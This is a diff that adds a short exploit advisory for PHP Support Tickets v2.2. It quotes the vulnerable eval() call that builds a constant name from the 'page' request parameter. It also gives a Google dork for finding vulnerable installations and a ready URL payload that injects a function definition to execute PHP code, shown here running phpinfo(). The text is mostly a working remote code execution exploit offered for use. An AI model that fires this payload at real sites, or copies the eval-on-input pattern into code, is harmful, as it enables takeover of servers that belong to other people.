@@ -1,0 +1,20 @@
+# Exploit Title: PHP Support Tickets v2.2 Code Exec
+# Google Dork: "PHP Support Tickets v2.2"
+# Date: 26.09.2010
+# Author: brain[pillow]
+# Software Link: http://www.phpsupporttickets.com/
+# Version: 2.2
+
+====================================================================
+# Vuln. code:
+
+/classes/GUI/abstract.GUI.php 
+
+    public function getPageName() { 
+        return eval('return PHPST_PAGENAME_' . strtoupper($this->page) . ';'); 
+    } 
+
+====================================================================
+# Exploit:
+
+/index.php?page=xek();function PHPST_PAGENAME_XEK(){phpinfo();}
